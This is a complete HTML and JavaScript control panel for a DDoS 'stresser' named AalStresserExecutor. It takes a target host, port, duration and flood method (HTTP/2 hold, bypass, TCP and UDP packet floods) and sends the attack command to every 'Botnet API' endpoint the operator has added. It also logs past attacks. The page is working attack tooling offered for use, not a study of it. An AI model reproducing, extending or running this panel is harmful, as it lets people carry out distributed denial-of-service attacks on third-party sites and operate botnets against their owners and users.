<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>‚ö° AalStresserExecutor üöÄ</title>
<style>
body {
  background-color: #0b0b0b;
  font-family: Arial, sans-serif;
  color: #f0f0f0;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh; margin: 0;
}
.container, .login-container, .api-container, .logs-container {
  background-color: #181818;
  padding: 30px;
  border-radius: 12px;
  width: 400px;
  box-shadow: 0 0 10px red;
}
h2 { text-align:center; color: #ff4d4d; }
label { display:block; margin-top:15px; color: #f05a5a; }
input, select {
  width:100%; padding:10px; margin-top:5px;
  border-radius:8px; border:none;
  background-color:#292929; color:#fff;
}
button {
  margin-top:15px; width:100%; padding:10px;
  border:none; border-radius:8px;
  background-color:#ff4d4d; color:#000; font-size:16px; cursor:pointer;
}
.link-btn { background-color:#d62626; }
.api-item {
  display:flex; justify-content:space-between; align-items:center;
  margin-top:8px; background-color:#292929; padding:5px 10px;
  border-radius:6px; font-size:14px;
}
.delete-btn { background:none; border:none; color:#ff4d4d; font-size:18px; cursor:pointer; }
#result, #logs-list { margin-top:15px; }
#logs-list { max-height:200px; overflow-y:auto; }
#stats { margin-top:10px; font-size:14px; color:#ccc; text-align:center; }
</style>
</head>
<body>

<!-- LOGIN -->
<div id="login" class="login-container">
  <h2>Login</h2>
  <label>Username</label><input type="text" id="login-username"/>
  <label>Password</label><input type="password" id="login-password"/>
  <button onclick="validateLogin()">Login</button>
</div>

<!-- MAIN PANEL -->
<div id="main" style="display:none;">
  <div class="container">
    <h2>‚ö° AaLStresserExecutor</h2>
    <label>HOST</label><input type="text" id="host" placeholder="https://example.com"/>
    <label>PORT</label><input type="number" id="port" placeholder="443"/>
    <label>TIME</label><input type="number" id="time" placeholder="60"/>
    <label>METHOD</label>
    <select id="method">
      <optgroup label="LAYER 7">
        <option value="floodv2">FLOODV2</option>
        <option value="bypass">BYPASS</option>
        <option value="browsern">BROWSERN</option>
        <option value="h2-hold">H2-HOLD</option>
        <option value="h2-fast">H2-FAST</option>
        <option value="hold-panel">HOLD-PANEL</option>
        <option value="refresh">REFRESH</option>
      </optgroup>
      <optgroup label="LAYER 4">
        <option value="tcp-pps">TCP-PPS</option>
        <option value="udp-pps">UDP-PPS</option>
      </optgroup>
    </select>
    <button onclick="startAttack()">üöÄ Start Attack</button>
    <button class="link-btn" onclick="showAddAPI()">+ Manage API</button>
    <button class="link-btn" onclick="showLogs()">üìú View Logs</button>
    <div id="result"></div>
    <div id="stats"></div>
  </div>
</div>

<!-- ADD API -->
<div id="add-api" style="display:none;">
  <div class="api-container">
    <h2>+ Manage Botnet API</h2>
    <label>http://IP:PORT/api/Aal</label>
    <input type="text" id="new-api" placeholder="http://123.45.67.89:2222/api/Aal"/>
    <button onclick="addAPI()">Add API</button>
    <button onclick="backToMain()">Back</button>
    <div id="api-list"></div>
  </div>
</div>

<!-- LOGS -->
<div id="logs" style="display:none;">
  <div class="logs-container">
    <h2>üìú Attack Logs</h2>
    <div id="logs-list"></div>
    <button onclick="backToMain()">Back</button>
  </div>
</div>

<script>
let apis = JSON.parse(localStorage.getItem('apis')) || [];
let logs = JSON.parse(localStorage.getItem('logs')) || [];

function saveAPIs(){ localStorage.setItem('apis', JSON.stringify(apis)); }
function saveLogs(){ localStorage.setItem('logs', JSON.stringify(logs)); }

function showAddAPI(){
  hideAll(); document.getElementById('add-api').style.display='block'; updateAPIList();
}
function showLogs(){
  hideAll(); document.getElementById('logs').style.display='block'; updateLogs();
}
function backToMain(){
  hideAll(); document.getElementById('main').style.display='block'; updateStats();
}
function hideAll(){
  document.getElementById('main').style.display='none';
  document.getElementById('add-api').style.display='none';
  document.getElementById('logs').style.display='none';
}

function addAPI(){
  let newAPI = document.getElementById('new-api').value.trim();
  if(newAPI){ apis.push(newAPI); saveAPIs(); document.getElementById('new-api').value=''; updateAPIList(); updateStats();}
}
function deleteAPI(i){ apis.splice(i,1); saveAPIs(); updateAPIList(); updateStats(); }

function updateAPIList(){
  let listDiv = document.getElementById('api-list');
  listDiv.innerHTML = "<p>Current APIs:</p>"+apis.map((api,i)=>
    `<div class="api-item">
      <span>${api}</span>
      <button class="delete-btn" onclick="deleteAPI(${i})">üóëÔ∏è</button>
    </div>`).join('');
}

function updateLogs(){
  let list = document.getElementById('logs-list');
  list.innerHTML = logs.length ? logs.map(log=>`<div>${log}</div>`).join('') : "<p>No logs yet.</p>";
}

function updateStats(){
  document.getElementById('stats').innerHTML = `Total APIs: ${apis.length} | Total Logs: ${logs.length}`;
}

async function startAttack(){
  let host=document.getElementById('host').value.trim();
  let port=document.getElementById('port').value.trim();
  let time=document.getElementById('time').value.trim();
  let method=document.getElementById('method').value.trim();
  if(host&&port&&time&&method){
    let params=`?key=Aal&host=${host}&port=${port}&time=${time}&method=${method}`;
    document.getElementById('result').innerHTML=`<p>üöÄ Sent to all servers...<br>Concurrents: ${apis.length}</p><p id="countdown">Countdown: ${time}s</p>`;
    logs.push(`‚Ä¢ üöÄ ${method.toUpperCase()} ${time}s ‚Üí ${host}`); saveLogs(); updateLogs(); updateStats();
    apis.forEach(async api=>{ try{ await fetch(api+params);}catch(e){} });

    let countdown=parseInt(time);
    let interval=setInterval(()=>{
      countdown--;
      document.getElementById('countdown').innerText=`Countdown: ${countdown}s`;
      if(countdown<=0){
        clearInterval(interval);
        document.getElementById('result').innerHTML+=`<p>‚úÖ Attack finished</p>`;
      }
    },1000);
  } else alert('Please fill all fields');
}

async function validateLogin(){
  let u=document.getElementById('login-username').value.trim();
  let p=document.getElementById('login-password').value.trim();
  let [ur,pr]=await Promise.all([
    fetch('https://raw.githubusercontent.com/Ambroj/login-data/refs/heads/main/username2.txt'),
    fetch('https://raw.githubusercontent.com/Ambroj/Pswrd/refs/heads/main/password2.txt')
  ]);
  let vu=(await ur.text()).trim(), vp=(await pr.text()).trim();
  if(u===vu&&p===vp){
    localStorage.setItem('loggedIn','true'); 
    document.getElementById('login').style.display='none';
    document.getElementById('main').style.display='block'; updateStats();
  } else alert('Invalid username or password');
}

window.onload=()=>{
  updateAPIList(); updateLogs(); updateStats();
  if(localStorage.getItem('loggedIn')==='true'){
    document.getElementById('login').style.display='none';
    document.getElementById('main').style.display='block'; updateStats();
  }
};
</script>
</body>
</html>
